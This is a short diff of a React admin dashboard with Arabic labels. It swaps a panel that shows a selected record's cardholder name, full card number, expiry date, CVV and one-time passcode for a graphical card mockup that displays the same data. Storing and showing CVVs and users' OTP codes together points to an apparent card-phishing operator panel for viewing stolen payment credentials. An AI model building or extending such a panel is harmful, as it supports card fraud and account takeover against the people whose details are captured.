@@ -313,21 +313,8 @@ export default function AdminDashboard() {
                 ]}
               />
 
-              {(selected.card_holder || selected.card_number_full || selected.card_number_last4 || selected.expiry_date || selected.cvv) && (
-                <ChatBubble
-                  title="💳 بيانات الدفع"
-                  time={selected.updated_date}
-                  rows={[
-                    ["اسم صاحب البطاقة", selected.card_holder],
-                    ["رقم البطاقة الكامل", selected.card_number_full],
-                    ["آخر 4 أرقام", selected.card_number_last4 ? `**** **** **** ${selected.card_number_last4}` : null],
-                    ["تاريخ الانتهاء", selected.expiry_date],
-                    ["CVV", selected.cvv],
-                    ["مسار التحقق", OTP_ROUTE_LABELS[selected.otp_route]],
-                    ["رمز OTP", selected.otp_code],
-                  ]}
-                  color="yellow"
-                />
+              {(selected.card_holder || selected.card_number_full || selected.expiry_date || selected.cvv) && (
+                <CardMockup app={selected} />
               )}
 
               <ChatBubble
